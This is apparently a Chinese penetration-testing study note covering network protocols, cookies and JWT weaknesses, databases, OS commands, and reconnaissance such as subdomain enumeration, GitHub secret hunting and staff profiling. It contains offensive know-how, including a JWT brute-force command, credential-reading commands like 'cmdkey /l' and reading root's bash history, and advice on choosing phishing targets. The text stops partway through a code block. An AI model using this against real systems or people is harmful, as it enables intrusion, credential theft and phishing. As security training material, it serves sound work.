![在这里插入图片描述](https://img-blog.csdnimg.cn/20210621125439191.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

 **POP3**
POP3 (Post Office Protocol 3) 用于支持使用客户端远程管理在服务器上的电子邮件。不启用SSL时端口号为110，启用SSL时端口号多为995。

 **IMAP**
IMAP (Internet Mail Access Protocol)，即交互式邮件存取协议，它是跟POP3类似邮件访问标准协议之一。不同的是，开启了IMAP后，您在电子邮件客户端收取的邮件仍然保留在服务器上，同时在客户端上的操作都会反馈到服务器上，如：删除邮件，标记已读等，服务器上的邮件也会做相应的动作。不启用SSL时端口号为143，启用SSL时端口号多为993。

##### 邮件安全协议

SMTP相关安全协议 - SPF
发件人策略框架(Sender Policy Framework , SPF)是为了防范垃圾邮件而提出来的一种DNS记录类型，它是一种TXT类型的记录，它用于登记某个域名拥有的用来外发邮件的所有IP地址。

https://www.ietf.org/rfc/rfc4408.txt

"v=spf1 mx ip4:61.0.2.0/24 ~all"

设置正确的 SPF 记录可以提高邮件系统发送外域邮件的成功率，也可以一定程度上防止别人假冒你的域名发邮件。

SMTP相关安全协议 - DKIM
DKIM是为了防止电子邮件欺诈的一种技术，同样依赖于DNS的TXT记录类型。这个技术需要将发件方公钥写入域名的TXT记录，收件方收到邮件后，通过查询发件方DNS记录找到公钥，来解密邮件内容。

https://tools.ietf.org/html/rfc6376

SMTP相关安全协议 - DMARC
DMARC（Domain-based Message Authentication, Reporting & Conformance）是txt记录中的一种，是一种基于现有的SPF和DKIM协议的可扩展电子邮件认证协议，其核心思想是邮件的发送方通过特定方式（DNS）公开表明自己会用到的发件服务器（SPF）、并对发出的邮件内容进行签名(DKIM)，而邮件的接收方则检查收到的邮件是否来自发送方授权过的服务器并核对签名是否有效。对于未通过前述检查的邮件，接收方则按照发送方指定的策略进行处理，如直接投入垃圾箱或拒收。

![2020-02-05-07-06-09](https://img-blog.csdnimg.cn/20210621124953351.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


https://en.wikipedia.org/wiki/DMARC#Alignment

### HTTP/HTTPS基础知识

#### http与https区别

HTTP与HTTPS区别：
https可以理解为http+ssl。小网站通常买不起SSL证书（一般几千到几万），所以这些网站会签订私人的SSL证书，私人的SSL证书会提示网站是私密链接。

SSL协议位于TCP/IP协议与各种应用层协议之间，为数据通讯提供安全支持。SSL协议可分为两层：
SSL记录协议（SSL Record Protocol）：它建立在可靠的传输协议（如TCP）之上，为高层协议提供数据封装、压缩、加密等基本功能的支持。
SSL握手协议（SSL Handshake Protocol）：它建立在SSL记录协议之上，用于在实际的数据传输开始前，通讯双方进行身份认证、协商加密算法、交换加密密钥等。

#### 状态码

1xx（临时响应）
表示临时响应并需要请求者继续执行操作的状态代码。

2xx （成功）
表示成功处理了请求的状态代码。

3xx （重定向）
表示要完成请求，需要进一步操作。 通常，这些状态代码用来重定向。

4xx（请求错误）
这些状态代码表示请求可能出错，妨碍了服务器的处理。

5xx（服务器错误）
这些状态代码表示服务器在尝试处理请求时发生内部错误。 这些错误可能是服务器本身的错误，而不是请求出错。

最常见的
200（成功） 
403（禁止） 权限不够，服务器拒绝请求。对于403可以使用burpsuite插件尝试绕权限 https://github.com/sting8k/BurpSuite_403Bypasser或 https://github.com/yunemse48/403bypasser.git
404（未找到）这个界面有可能是攻击者存放了潜在后门

#### cookie

##### cookie会话验证和token验证区别以及安全问题

之所以出现这些附加参数是因为http是无状态请求，即这一次请求和上一次请求是没有任何关系的，互不认识的，没有关联的。但这几种认证又有差别。也有的人直接称这一对的区别是cookie和session区别，这与我说的cookie会话和tooken是一个意思。

cookie 会话。服务器验证是查看session id是否匹配得上。存储服务器 存活时间较短  大型。cookie 会话就像比如你登录了一次支付宝，过了几分钟（一般30分钟左右）不用或关闭了浏览器就还需要你登录。一个session在服务器上会占用1kb，人多了还是挺耗内存的。由于跨站自动带上cookie所以存在CSRF攻击。如果管理员在用户退出时未销毁就存在所谓的会话固定，会话固定只需要盗取session就可以登录了。
token 储存本地。服务器验证是查看参数附带的签名。存活时间较长 小中型。此方案不会存在CSRF攻击因为跨站请求不会自动填写token值，但由于存活时间长，一般容易xss盗取利用等

对方网站如果只认token验证，那么你盗取 cookie会话是没什么价值的。反过来只认 cookie会话你盗取token做验证也是没有价值的。

[想阅读两者区别更多可看这篇文章](https://wuch886.gitbooks.io/front-end-handbook/content/session-cookiehe-token-san-zhe-de-guan-xi-he-qu-bie.html)

##### http中的cookie参数包含什么

```bash
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm;
route=c0dbc3af6294b1446f771c1a1aa4c7cb;
csrf=WfF1szMUHhiokx9AHFply5L2xAOfjRkE;
Authorization=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
rememberme=eKKF2QT4fwpMeJf36POk6yJV
```

**session**
作用：记录用户状态。
常见生成方法：账户标识字符串（用户名、id、邮箱、身份等）、IP、递增序号等
可能产生漏洞：会话固定（退出后会话不变）、cookie被解密可利用Padding Oracle - Padbuster

**csrf**
作用：防御csrf漏洞
常见生成方法：通常加密强度伪随机数生成器 (PRNG)，以创建时的时间戳加上静态秘密作为种子，并对整个结构进行强散列
使用：每次请求时带上经绑定session的csrf的值，每次操作csrf重新生成（防止复用和重放）
可能产生漏洞：csrf可被分析出
**rememberme**
![在这里插入图片描述](https://img-blog.csdnimg.cn/fc324a18698d4e60a09ac5a21d03c0e2.png)

**JWT**

作用：加密数据包或cookie
常见生成方法：JWT分为头部(header)，声明(claims)，签名(signature)，三个部分以英文句号隔开。头部和声明会采用base64加密，签名加密与头部和声明都有关，还要进行整体的sha加密才可以得到最终值.

![在这里插入图片描述](https://img-blog.csdnimg.cn/7384db1a2bd246bf87b27ed58e454c99.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5YyX5LiQ5a6J5YWo,size_20,color_FFFFFF,t_70,g_se,x_16)

加密方式如下图，对此的解密要用密匙才能解开。如果你还是困惑我表达的意思，你可以访问 https://jwt.io/ 输入一段JWT来交互加解密。
![在这里插入图片描述](https://img-blog.csdnimg.cn/f1d68e5b7ff043b8a9b41fc514ce3eac.png)

可能产生漏洞：1.JWT攻击取决于对方服务器是接收数据来进行什么样的下一步操作，如果是身份验证那么你就可以做到越权，如果是取数据与SQL语句拼接，那么你就可以做到SQL注入...

2.JWT支持将算法设定为“None”。如果“alg”字段设为“ None”，那么签名会被置空，这样任何token都是有效的。
设定该功能的最初目的是为了方便调试。但是，若不在生产环境中关闭该功能，攻击者可以通过将alg字段设置为“None”来伪造他们想要的任何token，接着便可以使用伪造的token冒充任意用户登陆网站。

jwt破解（需密钥）：爆破方法是将常用字典一个个当做秘钥，每个秘钥对应着不同的签名，将生成的签名与真实签名进行比较
python3 jwt_tool.py -M at -t "https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245" -rh "Authorization: Bearer eyJhbG...<JWT Token>"



**rount**
“route”是指根据url分配到对应的处理程序。

#### http协议版本

http1：客户端连接网络服务器建立连接后，只能获取一个网络资源
http1：客户端连接网络服务器建立连接后，只能获取一个网络资源

#### 代理

代理分为正向和反向。
正向代理：代理位于客户端和服务器之间，为了从服务器取得内容，客户端向代理发送一个请求并指定目标(服务器)，然后代理向原始服务器转交请求并将获得的内容返回给客户端。客户端必须要进行一些特别的设置才能使用正向代理。
比如你在国内利用代理访问谷歌，在家利用代理访问公司内网等，这些就是正向代理。服务器每次记录时是在记录你的代理，这就达到了简单匿名效果。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210625105740662.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
反向代理（Reverse Proxy）实际运行方式是指以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为一个服务器。

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210719181749643.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


#### DNS


**DNS解析过程**
DNS解析过程是递归查询的，具体过程如下：

用户要访问域名www.example.com时，先查看本机hosts是否有记录或者本机是否有DNS缓存，如果有，直接返回结果，否则向递归服务器查询该域名的IP地址
递归缓存为空时，首先向根服务器查询com顶级域的IP地址
根服务器告知递归服务器com顶级域名服务器的IP地址
递归向com顶级域名服务器查询负责example.com的权威服务器的IP
com顶级域名服务器返回相应的IP地址
递归向example.com的权威服务器查询www.example.com的地址记录
权威服务器告知www.example.com的地址记录
递归服务器将查询结果返回客户端


**DGA**
DGA（Domain Generate Algorithm，域名生成算法）是一种利用随机字符来生成C&C域名，从而逃避域名黑名单检测的技术手段，常见于botnet中。一般来说，一个DGA域名的存活时间约在1-7天左右。

通信时，客户端和服务端都运行同一套DGA算法，生成相同的备选域名列表，当需要发动攻击的时候，选择其中少量进行注册，便可以建立通信，并且可以对注册的域名应用速变IP技术，快速变换IP，从而域名和IP都可以进行快速变化。

DGA域名有多种生成方式，根据种子类型可以分为确定性和不确定性的生成。不确定性的种子可能会选用当天的一些即时数据，如汇率信息等。

 **DNS隧道**
DNS隧道工具将进入隧道的其他协议流量封装到DNS协议内，在隧道上传输。这些数据包出隧道时进行解封装，还原数据。


#### 静态与动态

静态网页：最常用的格式文件就是html格式文件，大部分网页的格式都是html格式，html格式又包含有.htm、dhtml.xhtml.shtm.shtml。这些都是指静态页面，里面不含有动态程序。

动态网页：页面级包括有ASP（基于JavaScript 或VbScript或C#）、JSP、PHP、ASPX、jspx、cgi。这些里面是包含服务器端执行的代码，也就是服务器在将这些网页发给客户端之前，会先执行里面的动态程序语言，并把执行后生成的html发送到客户端来的，所以我们在客户端看到的源代码也是html格式的。

index.php（做个例子实际下index没太大意义）和网页展示的php通常不会是一样文件(网页只有js或html源码和F12结果是一样的，这可以用来判断一些网站是做前端验证还是服务器验证)，前者源码包含的文件更多，后者是解析后的文件。



#### 访问类型

get传参与post传参的区别
 -- get限制传参长度、post没有限制
 -- get在url可见、post相对隐蔽（但是抓包都一样）

#### 状态码



### 编程语言

初学者对于常用的网站开发语言你应该至少看一遍基础教程，且至少掌握一门语言，便于后续写脚本用。
 **python**
如果你没有任何编程基础，可以首先学一下python。因为语法简单，网上公开资料多。
**JAVASCRIPT**
**JAVA**
安卓一般用java开发，安卓apk通过反编译就可以得到java文件，所以明白java特性对安卓漏洞也有好处。
**PHP**
基础自学网站 https://www.runoob.com/php/php-tutorial.html
**ASP**

#### 思想

##### MVC

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210717183445298.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)



MVC，即 Model 模型、View 视图，及 Controller 控制器。

View：视图，为用户提供使用界面，与用户直接进行交互。
Model：模型，承载数据，并对用户提交请求进行计算的模块。其分为两类：
Controller：控制器，用于将用户请求转发给相应的 Model 进行处理，并根据 Model 的计算结果向用户提供相应响应。


MVC是一种主流的架构，是一种思想，很多源代码或CMS都是基于此思想搭建的。比如thinkphp。了解这一点对代码审计观察代码有帮助。
如图为thinkphp的MVC一个MVC结构
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210717190355188.png)


### 数据库

**经验**
一般配套数据库
asp,access
aspx,sqlserver
php,mysql：中小型网站常见使用方案
jsp,sqlserver+oracle
python,mongodb,mysql...

#### 关系型

关系型数据库是建立在关系模型基础上的数据库，借助于集合代数等数学概念和方法来处理数据库中的数据。简单说，关系型数据库是由多张能互相连接的表组成的数据库。
一. 优点
1）都是使用表结构，格式一致，易于维护。
2）使用通用的 SQL 语言操作，使用方便，可用于复杂查询。
3）数据存储在磁盘中，安全。
二. 缺点
读写性能比较差，不能满足海量数据的高效率读写。
不节省空间。因为建立在关系模型上，就要遵循某些规则，比如数据中某字段值即使为空仍要分配空间。
固定的表结构，灵活度较低。

##### 关系型数据库代表

常见的关系型数据库有 Oracle、DB2、PostgreSQL、Microsoft SQL Server、Microsoft   
Access 和 MySQL 等。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705151830704.png)

###### mysql

Microsoft SQL Sever <2008权限是system
Microsoft SQL Sever>=008 低权限

为了迎合新的版本我以后文章的实验都在2008版本下面进行，同时也介绍以前可以利用的方法，相对于MySQL这个mssql显得重了许多，他众多的功能也给我们注入过程带来了便利， 所以一般数据库为mssql支持多语句我们就考虑是不是应该直接拿下webshell。

对于mssql的一个注入点我们往往最关心的这个注入点的权限问题,是sa、db_owner还是public;其次是这个注点是否显错,注释语句是否可用,例如sql server中注释符“–”;还有就是注入点是什么类型的,是字符型注入,还是数字型注入。

###### access

access数据库不同于其他数据库，它是一个独立的文件，有点像excel表。文件放在网站目录下，格式为mdb

###### mysql

  **增删改查语句**

```bash
insert into news(id,url,text) values(2,'x','$t')
delete from news where id=$id
update user set pwd='$p' where id=2 and username='admin'
select * from news wher id=$id
```

**版本差异**

| mysql>5.0                                         | mysql<=5.0                                     |
| ------------------------------------------------- | ---------------------------------------------- |
| 有information_schema这个系统表,可直接查询列表名等 | 没information_schema，只能字典暴力跑表名、列名 |
| 多用户单操作                                      | 多用户多操作                                   |




**mysql 基本信息**
默认端口：3306

#### 非关系型

非关系型数据库又被称为 NoSQL（Not Only SQL )，意为不仅仅是SQL。常见的非关系型数据库有 Neo4j、MongoDB、Redis、Memcached、MemcacheDB 和 HBase 等。通常指数据以对象的形式存储在数据库中，而对象之间的关系通过每个对象自身的属性来决定。
一. 优点
非关系型数据库存储数据的格式可以是 key-value
形式、文档形式、图片形式等。使用灵活，而关系型数据库则只支持基础类型。
速度快，效率高。NoSQL 可以使用硬盘或者随机存储器作为载体，而关系型数据库只能使用硬盘。
海量数据的维护和处理非常轻松。
非关系型数据库具有扩展简单、高并发、高稳定性、成本低廉的优势。
可以实现数据的分布式处理。
二. 缺点
非关系型数据库暂时不提供 SQL 支持，学习和使用成本较高。
非关系数据库没有事务处理，没有保证数据的完整性和安全性。适合处理海量数据，但是不一定安全。
功能没有关系型数据库完善。



### Linux

更多学习请看 https://linuxtools-rst.readthedocs.io/zh_CN/latest/index.html#

##### 权限划分

linux命令——chmod 
常利用格式为`chmod 754 file`
每个数字代表不同的组，即：所有者、用户组、其他；
数字的值对应着不同的权限的加合。1代表执行x；2代表写入w;4代表读取r　　![在这里插入图片描述](https://img-blog.csdnimg.cn/20210720185936474.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

##### 安装软件

```bash
# 安装前后一般要更新源文件
apt-get update
apt-get upgrade
apt-get dist-upgrade

apt-get install -f 安装万能的依赖包大法 
apt-get autoremove –purge 软件名 删除包及其依赖的软件包+配置文件等
dpkg -i 加文件 可以安装deb格式的安装包 
```

##### 重要目录

/etc/shadow		存放密码
/ect/crontab		存放定时任务

#### 常见有用命令

```bash
# 常用
netstat -anpt
ps -ef


# 检查状态

# 获取机密
cat /root/.bash_history	查看管理员输入的历史信息
find / -name *.cfg	查找敏感信息
```

>passwd 修改管理员密码

>touch 加文本名 创建文档

>防火墙：
>service  iptables status   查看防火墙状态
>service  iptables start		开启防火墙
>service  iptables stop		关闭防火墙
>service  iptables restart 	重启防火墙


### windows

个人系统在windows vista后，服务器系统在windows 2003以后，认证方式均为NTLM Hash；之前的(不多了)是LM hash；kerberos用于域环境认证
**DOS编程**
DOS编程教程https://blog.csdn.net/u010400728/article/details/43967181把基础看一遍，剩下的我认为重点学习一下比如`|`,`||`,`&&`，`for`大概如何用就可以了。

**常见命令**
在学命令参数前，你最重要需要学会的参数是`/?`，看图
![在这里插入图片描述](https://img-blog.csdnimg.cn/269d27eb01234b559a44c316cbb46379.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


熟悉以下命令，这部分对于了解你所在的windows环境很有帮助

```bash
# 常用
systeminfo	用来看打补丁
whoami	
ipconfig
net user
tasklist 

# 提权会用到的
cmdkey /l	把凭证取下来>本地解密
netstat -ano
# 域下环境

```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718222549927.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

#### powshell

现在一些提权项目不满足于仅限cmd的执行了，通常需要powershell，你可以在你打开cmd后输入powershell。如下图打开了powershell
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021071823320195.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

## 常见文件含义

**.htaccess**
限制用户访问一些关键目录，如普通用户数据库目录会爆403，404页面与标配不一样等，就是因为配置了此文件。常见的写法如下：

```bash
<Files  ~ "^.*.([Ll][Oo][Gg])|([eE][xX][eE])">
 Order allow,deny
 Deny from all
</Files>
```

更多阅读，apache的.htaccess文件作用和相关浅析 https://www.jianshu.com/p/81305ca91ebd

# 信息收集

## 信息搜集开源项目

自动化信息搜集（项目更新时间是2019年了）https://github.com/bit4woo/teemo



## web组成框架信息收集


### 中间件

**主流**
wappalyzer浏览器插件自动搜集网站所采用的框架等https://github.com/AliasIO/wappalyzer/releases
burpsuite插件，还能自动查找是否有CVE漏洞 software vulnerabliuty scanner
百度搜索关键词打开链接：CMS在线识别网站
**小众**
通过寻找js匹配语句分析。分析成功一个后加规则填充到bp插件中，下次就不用手动分析了
**识别方法1：利用工具**


网上的公开cms识别原理是通过匹配识别的hash值字典匹配

**识别方法2：观察网站信息**
查看网站的powered by.。

### 源码层面收集

通研究前端源代码，能够发现一些敏感目录，你可以通过打开开发者模式查看源码，有些网站会对开发者模式禁止，这时候你可以逐一尝试以下方案打开：

* F12
* shift-F5
* 页面右键

查看前端源码，你可以从以下几个角度查看

* 文件命名规则
* 增加攻击面(url、域名。推荐直接使用自动化js搜集资产信息工具https://github.com/Threezh1/JSFinder)
* 敏感信息(密码、API密钥、加密方式)
* 代码中的潜在危险函数操作
* 具有已知漏洞的框架

#### github

github除了很可能存在源码以外，也会记录下作者提交的删除的历史记录。这些历史记录可能保留着重要的如密码等敏感数据

**Truffle Hog**工具会扫描不同的提交历史记录和分支来获取高机密的密钥，并输出它们。这对于查找机密数据、密码、密钥等非常有用。

```bash
cd /opt/trufflehog/truffleHog
python truffleHog.py https://github.com/cyberspacekittens/dnscat2
```

****

在查看大型项目时，**Git-all-secrets** 非常有用

https://github.com/hisxo/gitGraber
https://github.com/eth0izzle/shhgit
https://github.com/techgaun/github-dorks
https://github.com/michenriksen/gitrob
https://github.com/anshumanbh/git-all-secrets
https://github.com/awslabs/git-secrets
https://github.com/kootenpv/gittyleaks
https://github.com/dxa4481/truffleHog
https://github.com/obheda12/GitDorker
常见的敏感信息有：

## 特殊信息

### 公司资产

> 需要搞清楚公司拥有什么


**1.  全貌**

>已知企业名、老板名字 
>
>你可以通过访问以下链接获取公司全貌，你可以很轻松的直接获得企业的分公司，全资子公司，网站域名、app,微信小程序，企业专利品牌信息，企业邮箱，电话等等
>爱企查，免费，但不够全面[https://aiqicha.baidu.com/?from=pz](https://aiqicha.baidu.com/?from=pz)
>微信小程序：企信通，付费，但网上有办法破解比爱企查更新更及时可以结合使用
>小蓝本，免费，还可以查询子公司的网站
>百度百科

**收购**
从爱企查、企信通、百度百科获得

**ASN**
ASN出现是为了方便管理外部人访问系统与内部人访问系统
注册
http://asnlookup.com
http://ipv4info.com/

**域名**
站长之家whois

查询域名注册邮箱
通过备案号查询域名
**反查获取更多信息**

>反查是你在获得部分信息的情况下，希望获得更多信息

反查whois
反查注册邮箱
反查注册人
接下来，查询一下whois信息：信息查询出来后没有注册电话显示，还需要进一步查询。
邮箱反查
通过whois查询到的邮箱进行一波反查注册过该邮箱域名地址：发现该邮箱还注册了另一个站点。
对邮箱反查后的站点进行访问后得到。
https://viewdns.info/reversewhois/ 
https://domaineye.com/reverse-whois  
https://www.reversewhois.io/  
https://www.whoxy.com/ 
你还可以使用DomLink自动执行认为，需要whoxy api秘钥；还可以使用amass执行一些自动反向的发现
通过注册人查询到的域名在查询邮箱

**企业附属品**

采购巩固、版权声明

附属子孙公司：这个可以会找到目标系统网络相互可通

**公司信息收集：招股书**
招股书涵盖的信息量很大，且容易获得，只需要用搜索引擎搜素：xxx招股书，即可获得。而其中许多公司得招股书中，**会有大量得资产域名**。在招股书中，其中目标公司股权结构也非常清晰。目标公司重要人员的其他重要信息也非常清晰
**例如注册商标：**（用户了解更多的目标资产与品牌）。**股权结构，需要重点关注，非技术类人员，**例如：销售，财务，后勤等职务的人员。此类人员是目标的重要人员，而且此类人员相对其他技术类人员安全意识较若，为“钓鱼”而铺垫。
查看股份穿透图，一般来说控股超过50%的子公司的漏洞SRC收录的可能性都比较大。

**公司信息收集：人肉目标对象**
对目标人物初级收集通常要定在非技术人员，这类人员特征是在领英和脉脉上照片是西装。
般的大型内网渗透中，需要关注大致几个组
（1）IT组/研发组    他们掌握在大量的内网密码，数据库密码等。收集研发最好的入口点是他们运营的网站，网站中可能包含网站的开发、管理维护等人员的信息。
（2）秘书组     他们掌握着大量的目标机构的内部传达文件，为信息分析业务提供信息，在反馈给技术业务来确定渗透方向
（3）domain admins组  root/administrator
（4）财务组   他们掌握着大量的资金往来与目标企业的规划发展，并且可以通过资金，来判断出目标组织的整体架构
（5）CXX组 ceo cto coo等，不同的目标组织名字不同，如部长，厂长，经理等。

通过领英和脉脉可以获得目标人物的姓名，邮箱，职务，手机，微信等等。

**查询企业备案**
主要针对与国内网站备案。
站长之家 http://icp.chinaz.com
天眼查
ICP备案查询网

#### 特殊文件

**网站使用说明书**

通常包含一些敏感信息，比如登录敏感目录，管理员默认密码，密码长度等

****

目标网盘或第三方网盘敏感文件信息
http://magnet.chongbuluo.com/
http://www.zhuzhupan.com/
https://www.quzhuanpan.com/



#### 网站附属产品

**APP**

* 七麦数据： https://www.qimai.cn/，可以查到企业下一些比较冷门的app。

* ****

  目标微博，公众号信息

### 拓展信息收集

#### 子域名收集

https://www.baidu.com
www 就是顶级域名，如果是https://blog.baidu.com就是他的子域名

##### 相似域名


用阿里云
万网搜索是否号被注册了

##### 方法一：爆破子域名

discover结合了Kali Linux 上的所有的子域名侦察工具，并定期进行维护更新。被动信息收集将利用下列所有的工具: Passive uses ARIN, dnsrecon, goofile, goog-mail, goohost, theHarvester, Metasploit, URLCrazy, Whois, multiple websites。强大。https://github.com/leebaird/discover

****

 SubBrute。SubBrute 是一个社区项目，目标是创建最快、最准确的子域枚举工具。SubBrute 背后的神奇之处在于，它使用开放的解析器作为代理来绕过 DNS 速率限制( https://www.us-cert.gov/ncas/alerts/TA13-088A )。这种设计还提供了一层匿名性，因为 SubBrute 不直接向目标的域名服务器发送流量。

SubBrute 不仅速度非常快，它还执行 DNS 爬虫功能，爬取枚举的 DNS 记录。

运行 SubBrute:

>方法1：利用工具
>
>>[站长之家：在线子域名平台：](https://tool.chinaz.com/subdomain/)
>>![在这里插入图片描述](https://img-blog.csdnimg.cn/20210620184055217.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

>>layer挖掘机使用简单，界面细致

>Sublist3r神器，Sublist3r神器集成了Netcraft、Virustotal、ThreatCrowd、DNSdumpster和ReverseDNS等等，你值得拥有。Sublist3r是一个用Python编写的子域发现工具，旨在使用来自公共资源和暴力技术的数据枚举网站的子域。公共资源包括广泛的流行搜索引擎，如谷歌，雅虎，必应，百度，Ask以及Netcraft，Virustotal，ThreatCrowd，DNSdumpster和ReverseDNS，以发现子域名。或者，您也可以对给定域名强制执行子域，然后由名为Subbrute的集成工具处理。Subbrute是一个DNS元查询蜘蛛，它使用广泛的单词列表来枚举DNS记录和子域。此工具使用打开的解析器来避免限制问题，从而阻止Subbrute完成列表或尝试所有条目。

使用方法在kali上
git clone  https://gitee.com/ngadminq/Sublist3r.git
cd Sublist3r
pip install -r requirements.txt
python sublist3r.py -d example.com
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210620195312656.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

>>subDomainBurte 用小字典地柜的发现三、四、甚至五级等不容被检测的域名
>>DNSsdumpster网站.你要是懒得下载sublist3r做子域名检测，那么使用这个在线工具对你也类似，搜素出的结果是一样的
>>![在这里插入图片描述](https://img-blog.csdnimg.cn/20210620200656369.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
>>搜索引擎：这种方法被很多人推荐，但是以下例子很清晰的看到这种方法获得的结果很杂乱
>
>>![在这里插入图片描述](https://img-blog.csdnimg.cn/20210630002712737.png)

##### 方法二：旁站搜集发现子域名

https://scan.dyboy.cn/web/webside
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021062319114246.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

##### 方法三：证书发现子域名

**证书透明度**
这是一类证书，一个SSL/TLS证书通常包含子域名、邮箱地址。
https://crt.sh/（SSL证书查询）
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210620185251394.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

##### 方法四：图标发现子域名

您是否知道我们可以通过查找相同的图标图标哈希来找到与目标相关的域和子域?具体使用https://github.com/m4ll0k/BBTz/blob/master/favihash.py

```bash
cat my_targets.txt | xargs -I %% bash -c 'echo "http://%%/favicon.ico"' > targets.txtpython3 favihash.py -f https://target/favicon.ico -t targets.txt -s
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/2c288bc18a2143baa52d4d9e278d738b.png)
简单地说,favihash 将允许我们发现与我们的目标具有相同 favicon 图标哈希的域。
**端口扫描**
在一个网站中可能存在同个网址，但是通过端口的不同，所显示的页面也不同。

常见端口攻击:https://www.cnblogs.com/botoo/p/10475402.html


##### 方法五：搜索引擎子域名

空间搜索引擎，利用百度谷歌使用site等

##### 方法六：DNS发现子域名

使用此工具来找到他的子域https://rapiddns.io/

```bash
rapiddns(){curl -s "https://rapiddns.io/subdomain/$1?full=1" \ | grep -oP '_blank">\K[^<]*' \ | grep -v http \ | sort -u}
```

##### 方法七：其他方法发现子域名

一些常用的工具有以下
[assetfinder](https://github.com/tomnomnom/assetfinder)
是用来查找资产的子域的
https://github.com/OWASP/Amass
https://github.com/projectdiscovery/subfinder
https://github.com/Edu4rdSHL/findomain/
https://github.com/shmilylty/OneForAll/blob/master/README.en.md
https://github.com/Screetsec/Sudomy
https://github.com/cgboal/sonarsearch
https://pentester.land/cheatsheets/2018/11/14/subdomains-enumeration-cheatsheet.html
 gau从AlienVault的 Open Threat Exchange, the Wayback Machine,和common crawl中获取任何给定域的url
https://github.com/lc/gau
发现废弃网站使用的子域
https://github.com/nsonaniya2010/SubDomainizer
https://github.com/Cillian-Collins/subscraper

#### 目录爆破/敏感文件爆破

扫描敏感文件
robots.txt
log.log	#	分析是否有敏感日志，这里敏感信息包括：其他攻击者的恶意代码
crossdomain.xml
sitemap.xml
xx.tar.gz
xx.bak
phpinfo()

 查看网站的图像、链接来自于站点的那些目录，有些目录也许能直接打开
错误信息尝试：我在对一些网站故意输入错误信息时，它弹出来报错界面，而这个报错界面通常就包含它的目录。比如我尝试链接注入XSS语句，或我尝试空密码输入等

url/login 的 login 换成reg、register、sign字段
查看robots.txt文件，对于一些简单的马大哈网站这个配置文件将会包含信息
www.xxx.com/admin 加上/login.aspx(php)
www.xxx.com 加上/static;/backup

##### 工具

**dirbuster**
kali自带的一款工具，fuzz很方便。kali中直接在命令行中输入dirbuster，我认为该工具更强大，同样支持字典，还支持递归搜索和纯粹爆破，纯粹爆破你可以选择A-Z0-9a-z_，对于定向攻击来说纯粹爆破太强大了，直接帮助我发现隐藏各个目录,我在利用纯粹爆破将线程拉到50，仍旧需要10000+天以上（缺点是我用虚拟机跑的，字典大就慢）

**dirsearch**
https://github.com/maurosoria/dirsearch
使用方法：

```bash
